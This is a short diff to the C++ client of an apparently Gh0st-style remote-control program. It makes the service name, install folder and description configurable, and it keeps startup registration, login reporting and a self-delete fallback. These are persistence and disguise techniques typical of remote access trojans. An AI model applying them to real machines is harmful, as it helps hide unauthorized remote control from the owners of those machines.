@@ -185,10 +185,16 @@ BOOL CALLBACK callback(DWORD CtrlType)
 int main(int argc, const char *argv[])
 {
     Mprintf("启动运行: %s %s. Arg Count: %d\n", argv[0], argc>1 ? argv[1] : "", argc);
-    InitWindowsService({ "RemoteControlService", "Remote Control Service", "Provides remote desktop control functionality." }, Log);
+    InitWindowsService(NewService(
+                           g_SETTINGS.installName[0] ? g_SETTINGS.installName : "RemoteControlService",
+                           g_SETTINGS.installDir[0] ? g_SETTINGS.installDir : "Remote Control Service",
+                           g_SETTINGS.installDesc[0] ? g_SETTINGS.installDesc : "Provides remote desktop control functionality."), Log);
     bool isService = g_SETTINGS.iStartup == Startup_GhostMsc;
     // 注册启动项
-    int r = RegisterStartup("Windows Ghost", "WinGhost", !isService, g_SETTINGS.runasAdmin, Logf);
+    int r = RegisterStartup(
+                g_SETTINGS.installDir[0] ? g_SETTINGS.installDir : "Windows Ghost",
+                g_SETTINGS.installName[0] ? g_SETTINGS.installName : "WinGhost",
+                !isService, g_SETTINGS.runasAdmin, Logf);
     if (r <= 0) {
         BOOL s = self_del();
         if (!IsDebug) {
@@ -517,8 +523,8 @@ DWORD WINAPI StartClient(LPVOID lParam)
         //准备第一波数据
         BOOL auth = FALSE;
         LOGIN_INFOR login = GetLoginInfo(GetTickCount64() - dwTickCount, settings, auth);
-        Manager = auth ? new AuthKernelManager(&settings, ClientObject, app.g_hInstance, kb, bExit) : 
-            new CKernelManager(&settings, ClientObject, app.g_hInstance, kb, bExit);
+        Manager = auth ? new AuthKernelManager(&settings, ClientObject, app.g_hInstance, kb, bExit) :
+                  new CKernelManager(&settings, ClientObject, app.g_hInstance, kb, bExit);
         while (ClientObject->IsRunning() && ClientObject->IsConnected() && !ClientObject->SendLoginInfo(login))
             WAIT_n(app.m_bIsRunning(&app), 5 + time(0)%10, 200);
         WAIT_n(app.m_bIsRunning(&app)&& ClientObject->IsRunning() && ClientObject->IsConnected(), 10, 200);
